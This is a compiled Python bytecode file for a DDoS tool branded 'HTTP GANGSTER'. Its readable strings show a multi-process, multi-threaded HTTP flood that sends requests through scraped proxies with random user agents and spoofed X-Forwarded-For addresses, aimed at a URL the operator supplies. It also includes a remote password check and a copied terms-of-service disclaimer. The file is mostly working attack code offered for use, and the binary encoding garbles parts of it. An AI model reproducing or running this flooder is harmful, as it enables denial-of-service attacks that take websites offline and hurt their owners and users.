�
[z�U�4  �            %   @   s|  d  d l  Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d d d d d d d d d	 d
 d d d d d d d d d d d d d d d d d d d d d d  d! d" d# d$ d% g% Z Gd& d' �  d' e j � Z Gd( d) �  d) e j � Z Gd* d+ �  d+ � Z e d, k rxe �  Z e j �  n  d S)-�    NzpMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36zeMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3zAMozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0zHMozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0zEMozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0zEMozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0zAMozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0zLMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0z:Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))zGMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)zlMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)zRMozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)z<Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00z9Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14zKMozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14z>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14zAOpera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02zBOpera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00zBOpera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00zSMozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)zJHTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)z^Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+zyMozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7z�Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5z~Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2zvMozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10z~Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3zxMozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27c               @   s(   e  Z d  Z d d �  Z d d �  Z d S)�	MyProcessc             C   s/   t  j j |  � | |  _ | |  _ | |  _ d  S)N)�multiprocessing�Process�__init__�url�
proxy_list�threads_number)�selfr   r   r   � r
   �sock.pyr   /   s    		zMyProcess.__init__c             C   s7   x0 t  |  j � D] } t |  j |  j � j �  q Wd  S)N)�ranger   �Boomerr   r   �start)r	   �ir
   r
   r   �run4   s    zMyProcess.runN)�__name__�
__module__�__qualname__r   r   r
   r
   r
   r   r   .   s   r   c               @   sL   e  Z d  Z d d �  Z d d �  Z d d �  Z d d �  Z d	 d
 �  Z d S)r   c             C   s>   t  j j |  � | |  _ | |  _ t j d d d � |  _ d  S)Nr   �
   �   )�	threading�Threadr   �
target_urlr   �random�	randrangeZprob)r	   r   r   r
   r
   r   r   <   s    		zBoomer.__init__c             C   sz   t  j �  t t  j d d � � d t t  j d d � � d } | t t  j d d � � d t t  j d d � � } | S)Nr   ��   �.)r   �seed�str�randint)r	   �resultr
   r
   r   �randomIpB   s    
66zBoomer.randomIpc             C   s_   t  j �  d } x4 t t  j d d � � D] } | |  j �  d } q) W| d t | � d � S)N� �   �   z, r   )r   r   r   r   r!   �len)r	   �resZipr
   r
   r   �randomIpListH   s
    
zBoomer.randomIpListc             C   s   t  j t � S)N)r   �choice�CONST_USERAGENT)r	   r
   r
   r   �randomUserAgentO   s    zBoomer.randomUserAgentc             C   s�  d } t  j d d d � d k r* d } n  t  j |  j � j d � } | d |  j d	 } |  j j d
 d � j d d � j d � d } d | d } d } d |  j �  d } d } d |  j �  d }	 | | | | |	 | d }
 x� y� t	 j	 t	 j
 t	 j � } | j | d t | d � f � | j |
 j d � � t d | d � y( x! t d � D] } | j |
 � q_WWn d } Yn XWq� t  j |  j � j d � } Yq� Xq� d  S)NZGETr   r   r   �   ZPOST�:� z HTTP/1.1
zhttp://r"   zhttps://�/zHost: z/ 
z Accept-Encoding: gzip, deflate
zUser-Agent: z
z?Connection: Keep-Alive, Persist
Proxy-Connection: keep-alive
zX-Forwarded-For: zutf-8�@z request make.�   )r   r   r(   r   �splitr   �replacer*   r'   �socketZAF_INETZSOCK_STREAMZconnect�int�send�encode�printr   )r	   �methodZproxy_selected�headZhost_url�hostZacceptZ
user_agentZ
connectionZx_forwarded_forZhttp_request�sr   Ztts�proxyr
   r
   r   r   R   s2    	.!z
Boomer.runN)r   r   r   r   r!   r'   r*   r   r
   r
   r
   r   r   :   s
   r   c               @   s@   e  Z d  Z d d �  Z d d �  Z d d �  Z d d �  Z d	 S)
�Mainc             C   s�   t  j d k r{ t  j d � t  j d � t  j d � d d d	 d
 d d g } t  j d | t j d t | � d � � nP d d d d d d d d d d d d d g } t | t j d t | � d � � d } t | � d  S)N�nt�dos�ce�clszAtitle       ..................::HTTP GANGSTER::..................zcolor a�a�b�c�d�e�fzcolor %sr   r   z[31mz[32mz[33mz[34mz[35mz[36mz[37mz[95mz[94mz[92mz[93mz[91mz[0mu�   
                     _     _  ___          _ _____      
                  __| | __| |/ _ \ ___  __| |___ /_   __
                 / _` |/ _` | | | / __|/ _` | |_ \ \ / /
                | (_| | (_| | |_| \__ \ (_| |___) \ V / 
                 \__,_|\__,_|\___/|___/\__,_|____/ \_/   
                ### Using this program you are responsible of your action.
                ### Be carefull and read TOS.
                ### Author and copyright are reserverd by dd0sd3v t34m.

                BY ACCESSING AND USING THE SERVICES IN ANY MANNER, YOU ARE "ACCEPTING" 
                AND AGREEING TO BE BOUND BY THESE TERMS OF SERVICE TO THE EXCLUSION OF ALL OTHER TERMS. 
                IF YOU DO NOT UNCONDITIONALLY ACCEPT THESE TERMS IN THEIR ENTIRETY, 
                YOU SHALL NOT (AND SHALL HAVE NO RIGHT TO) ACCESS OR USE THE SERVICES. 
                IF THE TERMS OF THIS AGREEMENT ARE CONSIDERED AN OFFER, ACCEPTANCE IS EXPRESSLY LIMITED TO SUCH TERMS. 
                THESE TERMS SHOULD BE READ IN CONJUNCTION WITH HOOTSUITEâ€™S PRIVACY POLICY AND COPYRIGHT POLICY.

                Wherever used in these Terms of Service, â€œyouâ€, â€œyourâ€, â€œCustomerâ€, or similar terms means 
                the person or legal entity accessing or using the Services.  If you are accessing and 
                using the Services on behalf of a company (such as your employer) or other legal entity, 
                you represent and warrant that you have the authority to bind that company
                or other legal entity to these Terms of Service.


                ..................::HTTP GANGSTER::..................
        )zntr?   r@   )�os�name�systemr   r   r%   r7   )r	   ZcolorZlinux_shell_colorZ
disclaimerr
   r
   r   r   �   s,    -	#zMain.__init__c             C   sn   | d | d | d | d d k r5 d | } n5 | d | d | d | d d k r` n
 d | } | S)Nr   r   r#   r0   zwww.zhttp://�httpr
   )r	   r   r
   r
   r   �	check_url�   s    ((
zMain.check_urlc          
   C   s�   t  j j d � } t | j �  � } | j d � } | d j d � } | d j d � } d } xJ | D]B } | j d � } y" | | d d	 | d d
 } Wqf Yqf Xqf Wt d d � } | j | � | j �  d  S)Nzhttp://free-proxy-list.net/z<tbody>r   z</tbody>r   z<tr><td>r"   z	</td><td>r,   �
z	proxy.txt�w)	�urllib�request�urlopenr   �readr1   �open�write�close)r	   �
sourcecodeZhalfr   r<   Zout_filer
   r
   r   �retrieve_proxy�   s    "	zMain.retrieve_proxyc             C   s  d } d } y: t  d d � �% } | j �  } | j d d � } Wd  QXWn t d � t j d � Yn Xy t j j d	 � } Wn t d
 � t j d � Yn Xt	 | j
 �  j d � � } t j | j d � | j d � � j �  d | } | | k rt d � t j d � n  t d � t d � } |  j | � } xS y; t	 t d � � }	 |	 d k ru|  j �  t d � Pn PWq<t d � Yq<Xq<x� t	 t d � � }
 |
 d k r�d }
 n  yE t  |
 d � } g  } x( | D]  } | j | j d � d � q�WPWq�t d � Yq�Xq�x+ y t t d � � } Wn d } Yn XPqx+ y t t d � � } Wn d } Yn XPqGxL t | � D]> } t | | � j �  t j d � t d t	 | � d � qW| d k r�x- t | � D] } t | | | � j �  q�Wn  d  S)Nzjjvbag%z	&kk17cnH%zpassword.txt�rrM   r"   z# Could not find password.txt.r   z6http://davide-gastaldello.it/other/pwdhttpgangster.txtz8# Impossible to connect to the server, please try again.zutf-8z8a,z�##FATAL ERROR##

You maybe need to update this program or your password isn't correct.

Check http://adf.ly/1MvW1X for more information or contact me at http://adf.ly/1MvWIx.z# Password correct.z# Enter URL to send requests: zF# Enter 'y' to download a fresh proxy list or or leave empty to skip: �yz%# Proxy list successfully downloaded.z$# Failed to download the proxy list.zC# Enter the proxy list or leave empty to skip default [proxy.txt]: z	proxy.txtz/nz# Error to read file.zM# Enter the number of parallel processes or leave empty to skip default [0]: zC# Enter the number of thread or leave empty to skip default [800]: i   g�~j�t�h?zThread z is going up)rS   �readliner2   r7   �sys�exitrO   rP   rQ   r   rR   �decode�hashlibZsha1r6   Z	hexdigest�inputrL   rW   �appendr1   r4   r   r   r   �timeZsleepr   )r	   Z
public_keyZ
secret_keyrG   Zpassword_filerV   Zhash1Zhash2r   r;   Zipotetical_listZin_filer   r   Zpools_numberr   Zpool_numberr
   r
   r   �setup�   s~    

3



	z
Main.setupN)r   r   r   r   rL   rW   rb   r
   r
   r
   r   r=   �   s   5	r=   �__main__)Zurllib.requestrO   rH   r   ra   r   r[   �stringr   r^   Zgetpassr3   Zhttp.clientrK   r)   r   r   r   r   r=   r   �mainrb   r
   r
   r
   r   �<module>   sV   �	F�	